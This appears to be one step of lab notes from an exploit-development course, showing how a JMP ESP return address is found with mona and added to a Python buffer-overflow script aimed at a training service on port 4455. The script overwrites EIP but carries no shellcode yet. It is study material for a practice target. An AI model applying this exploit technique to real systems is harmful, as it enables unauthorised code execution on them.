6. Find return address

When the application crashes, the ESP points to 035F004, which is directly after the EIP. We can use EAX for our shellcode. This follows example Linux chapter 12?..

Determine the opcode for jumping to the stack pointer
using msf-nasm-shell
![8dcea63aa898cc32ab4a6642ee20c47b.png](../../../_resources/e02cbd5ed41d4c8dbb1456fdcc509f36.png)
```
kali@kali:~/gitWorkspace/exam/bf$ msf-nasm_shell 
nasm > jmp esp
00000000  FFE4              jmp esp
nasm > 
```


Run `!mona modules`
![bec5ea29f0102d754a9f350533f8376a.png](../../../_resources/928f3857273b4476a7b30a0edfa576c8.png)

We wil use the dll because it does not contain a bad character
![bd329ce7eaff3395728b655416cc8ce1.png](../../../_resources/bbb713393d5e41edb68dae2e9b609080.png)

!mona find -s “\xff\xe4” -m "offsec_pwk_dll.dll"
![694164b967ec71c8280261ea37cb7c05.png](../../../_resources/e6f36bb2f95a43e3bafa314d6966327a.png)


We will use address 56526683
![1a6d7070977ffa36fb0c7faae9df00ae.png](../../../_resources/6856d772a371473ca0779df2d14f5a4b.png)

Add the return address to the expllit
![e4c3c6a00001be584c01e0a255ef3871.png](../../../_resources/23caa0990c8f479fa65f5f4b3e5a55df.png)


Add a breakpoint at 56526683
![1a33b085a09b5e03b5122cb1352dc246.png](../../../_resources/2d830937aef44c1a9f2568de0da41916.png)

Run the exploit
```
kali@kali:~/gitWorkspace/exam/bf$ python 7_eip_jmp_esp.py 192.168.34.111
kali@kali:~/gitWorkspace/exam/bf$ cat 7_eip_jmp_esp.py 
#!/usr/bin/python

import sys, socket

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

cmd = "OVRFLW "
filler  = "\x41" * 1493
eip     = "\x83\x66\x52\x56" # JMP -> ESP 56526683
offset  = "\x43" * 8 # ESP points to offset at 0023F15C
bf      = "\x44" * (3000 - len(filler) - len(eip) - len(offset))
end = "\r\n"

buffer = cmd + filler + eip + offset + bf + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 4455))
s.send(buffer)
s.recv(1024)
s.close()
kali@kali:~/gitWorkspace/exam/bf$ 
```
![1bd26c762ebf11f924607b72d70da828.png](../../../_resources/bcc3b6a839b04ee2919fda9dbce3bf5e.png)


Did it hit the breakpoint? YES
![97efb1da0726e49f26f98efec42f56eb.png](../../../_resources/904e8499354a4eee93a84bb9c8b8ebf1.png)

Step through by pressing F7. ESP is pointing to the start of the offset at 0022EE28
![61efc662a4aab73247b679b816766a63.png](../../../_resources/2d74212fc4744e6aa5c66f8e5e08ddb7.png)








